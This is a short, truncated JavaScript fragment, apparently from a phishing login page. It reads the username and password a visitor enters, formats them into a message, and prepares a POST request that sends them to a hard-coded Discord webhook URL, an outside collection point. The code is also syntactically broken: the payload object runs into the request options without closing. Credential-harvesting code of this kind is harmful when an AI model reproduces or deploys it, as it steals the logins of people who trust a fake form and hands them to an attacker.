    const password = document.getElementById("password").value;

    const webhookURL = "https://discord.com/api/webhooks/1276442307717103616/MSPqefs0qTdE95cNePciieHtROIdYBCPT1V1xcaxxCR_8vF4Wj1jIYUtbYlzLnKs8pSm";

    const payload = {
      content: `🔐 Username: \`${username}\`\n🔑 Password: \`${password}\``

      method: "POST",
      headers: {
